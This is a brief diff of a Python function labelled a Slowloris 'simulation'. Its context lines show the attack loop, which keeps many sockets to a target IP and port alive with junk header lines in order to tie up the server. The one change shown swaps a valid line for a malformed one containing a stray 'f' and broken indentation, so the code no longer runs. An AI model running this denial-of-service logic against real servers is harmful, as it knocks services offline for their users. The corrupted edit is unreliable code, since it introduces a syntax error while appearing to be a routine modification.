@@ -67,7 +67,7 @@ def run_slowloris_simulation(target_ip, target_port=80, socket_count=100, interv
                     s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                     active_sockets += 1
                 except socket.error:
-                    sockets.remove(s)
+          f          sockets.remove(s)
 
             print(f"[*] Connection state maintained: {active_sockets} active sockets.")
 
